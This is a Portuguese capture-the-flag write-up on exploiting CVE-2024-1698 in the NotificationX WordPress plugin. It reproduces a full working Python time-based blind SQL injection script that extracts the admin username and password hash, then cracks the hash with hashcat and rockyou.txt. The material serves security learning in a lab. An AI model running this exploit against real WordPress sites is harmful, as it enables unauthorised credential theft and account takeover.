# SQL Injection

## Reconhecimento

Ao abrir o website a primeira informação que tentámos encontrar é a versão do Wordpress que normalmente se encontra nos metadados do website com o name="generator".

![Wordpress Version](/screenshots/CTF8_1.png)

Procurando por vulnerabilidades relacionadas a essa versão do Wordpress não encontrámos nada relacionado a SQL Injection.

Ao analisar o comentário pop-up que regularmente aparecia utilizando o serviço Notification-X:

![Notificação](/screenshots/CTF8_2.png)

Dava a informação que o hash da palavra-passe do adminstrador começava por $P$B.

Em baixo tem um form que possibilita o utilizador responder ao comentário que comunica com a base de dados através de wp-comments-post.php. 

![Form](/screenshots/CTF8_3.png)

Para testar a possibilidade de um ataque através deste form inserimos caracteres especiais frequentemente usados em injeções SQL, como: ```' OR '1'='1```, ```' OR 1=1 --``` e ```' UNION SELECT NULL, NULL --```. Todos sem sucesso pois o ao comentar qualquer input dava erro.

![Erro Reply](/screenshots/CTF8_4.png)

Finalmente procurando por mais vetores de ataque procurámos por vulnerabilidades relacionadas ao serviço de notificações utilizado e sabendo que a sua versão é a 2.8.1 encontrámos o CVE-2024-1698.

![Versão Notification-X](/screenshots/CTF8_5.png)

![CVE Details](/screenshots/CTF8_6.png)

Procurámos por PoCs (Proofs of Concept) da exploit em questão encontrando vários scripts tais como:

```py
import requests
import string
from sys import exit

# Sleep time for SQL payloads
delay = 3

# URL for the NotificationX Analytics API
url = "http://44.242.216.18:5008/wp-json/notificationx/v1/analytics"

admin_username = ""
admin_password_hash = "$P$B"  # Start with the known prefix

session = requests.Session()

# Find admin username length
username_length = 0
for length in range(1, 41):  # Assuming username length is less than 40 characters
    resp_length = session.post(url, data={
        "nx_id": 1337,
        "type": f"clicks`=IF(LENGTH((select user_login from wp_users where id=1))={length},SLEEP({delay}),null)-- -"
    })

    # Elapsed time > delay if delay happened due to SQLi
    if resp_length.elapsed.total_seconds() > delay:
        username_length = length
        print("Admin username length:", username_length)
        break

# Find admin username
for idx_username in range(1, username_length + 1):
    # Iterate over all the printable characters
    for ascii_val_username in string.printable:
        # Send the payload
        resp_username = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx_username},1))={ord(ascii_val_username)},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_username.elapsed.total_seconds() > delay:
            admin_username += ascii_val_username
            # Show what we have found so far...
            print("Admin username:", admin_username)
            break  # Move to the next character

# Find admin password hash starting from the known prefix
for idx_password in range(4, 41):  # Assuming the password hash length is less than 40 characters
    # Iterate over all the printable characters
    for ascii_val_password in string.printable:
        # Send the payload
        resp_password = session.post(url, data={
            "nx_id": 1337,
            "type": f"clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx_password},1))={ord(ascii_val_password)},SLEEP({delay}),null)-- -"
        })

        # Elapsed time > delay if delay happened due to SQLi
        if resp_password.elapsed.total_seconds() > delay:
            admin_password_hash += ascii_val_password
            # Show what we have found so far...
            print("Admin password hash:", admin_password_hash)
            break  # Move to the next character

print("[*] Admin credentials found:")
print("Username:", admin_username)
print("Password hash:", admin_password_hash)
```

Ajustámos os campos url, admin_password_hash utilizando a pista dada pelo comentário do concerned-hacker e o delay dos payloads SQL.

Correndo o script descobrímos o hash da password do admin:

![Resultado Script](/screenshots/CTF8_7.png)

O hash segue o formato de PHPPass, um algoritmo comumente usado para proteger senhas no Wordpress. O hashcat suporta o formato PHPPass através do modo 400.

Utilizando o hashcat com os parâmetros hashcat -m 400 -a 0 hash rockyou.txt, sendo o último ficheiro uma coleção de passwords mais utilizadas que encontrámos no github, descodificamos a flag heartbroken.

![Resultado Hashcat](/screenshots/CTF8_8.png)